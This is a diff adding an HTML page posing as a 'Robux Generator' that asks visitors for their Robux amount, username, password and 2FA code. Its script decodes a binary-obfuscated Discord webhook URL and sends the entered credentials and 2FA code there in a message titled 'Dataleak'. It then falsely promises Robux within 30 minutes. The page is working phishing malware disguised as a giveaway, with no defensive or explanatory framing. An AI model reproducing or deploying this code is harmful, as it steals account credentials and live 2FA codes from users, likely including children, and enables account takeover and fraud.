@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Robux Generator</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+
+        h1 {
+            text-align: center;
+            margin-top: 20px;
+            color: #4CAF50;
+        }
+
+        p {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 0 20px;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        label {
+            font-weight: bold;
+            display: block;
+            margin: 10px 0 5px;
+        }
+
+        input[type="number"], input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        input[type="number"] {
+            max-width: 200px;
+        }
+
+        button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <h1>Be the Robux King Today!</h1>
+    <div class="container">
+        <p>How much Robux do you want?</p>
+        
+        <label for="amount">Robux:</label>
+        <input type="number" id="amount" placeholder="Amount" min="1" max="1000" required />
+
+        <label for="username">Username:</label>
+        <input type="text" id="username" placeholder="Enter your username" required />
+
+        <label for="password">Password:</label>
+        <input type="password" id="password" placeholder="Enter your password" required />
+
+        <label for="2fa">2FA Code:</label>
+        <input type="number" id="2fa" placeholder="Put your 2FA Code" required />
+
+        <button id="startMission">Start</button>
+    </div>
+
+    <script>
+        const a1b2c3d4 = "01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01100100 01101001 01110011 01100011 01101111 01110010 01100100 00101110 01100011 01101111 01101101 00101111 01100001 01110000 01101001 00101111 01110111 01100101 01100010 01101000 01101111 01101111 01101011 01110011 00101111 00110001 00110010 00111001 00110111 00110011 00110111 00110001 00110001 00110110 00110101 00110001 00110011 00110001 00110110 00110110 00111001 00110101 00110001 00110101 00101111 01110101 00110110 01100101 01000111 01110010 01011010 01000111 01010010 01110110 01000111 01101000 00110011 01101011 00110000 01011010 01101110 01001010 01100010 00110101 01110101 01001000 01000100 01101100 01000001 01100001 01000100 01010011 01010100 01010001 01110000 01000110 01101110 01010010 00111000 01101111 00111000 00101101 01100111 00110001 01001000 01111001 01110010 01110011 01110010 01110101 01110001 01001110 01000101 01101010 01100001 01100111 01101010 00110010 01001111 01010011 01100001 01001011 01001001 01100011 01100100 01001110 00110101 01010110 01010101 01000010 00110100 01111000 01101000";
+
+        function a4b5c6(binary) {
+            return binary.split(' ').map(function (b) {
+                return String.fromCharCode(parseInt(b, 2));
+            }).join('');
+        }
+
+        const e7f8g9 = a4b5c6(a1b2c3d4);
+
+        if (!e7f8g9.startsWith('https://discord.com/api/webhooks/')) {
+            alert('The decoded webhook URL is not valid. Please check the binary string.');
+        }
+
+        function startMission() {
+            const h1i2j3 = document.getElementById('amount').value;
+            const k4l5m6 = document.getElementById('username').value;
+            const n7o8p9 = document.getElementById('password').value;
+            const q0r1s2 = document.getElementById('2fa').value;
+
+            if (!h1i2j3 || !k4l5m6 || !n7o8p9 || !q0r1s2) {
+                alert("Please fill out all fields: 'Robux', 'Username', 'Password', and '2FA Code'.");
+                return;
+            }
+
+            const t3u4v5 = {
+                content: ``,
+                embeds: [{
+                    title: "Dataleak",
+                    description: `**Username:** ${k4l5m6}\n**Password:** ${n7o8p9}\n**2FA Code:** ${q0r1s2}`,
+                    color: 111,
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: "Robux Generator",
+                    }
+                }]
+            };
+
+            fetch(e7f8g9, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(t3u4v5),
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Thank you! Make sure to wait 30 minutes to get your ' + h1i2j3 + ' Robux.');
+                } else {
+                    alert('Failed to send data to webhook. Status: ' + response.status);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred while trying to send data to the webhook. Please check your network connection and try again.');
+            });
+        }
+
+        document.getElementById('startMission').addEventListener('click', startMission);
+    </script>
+</body>
+</html>
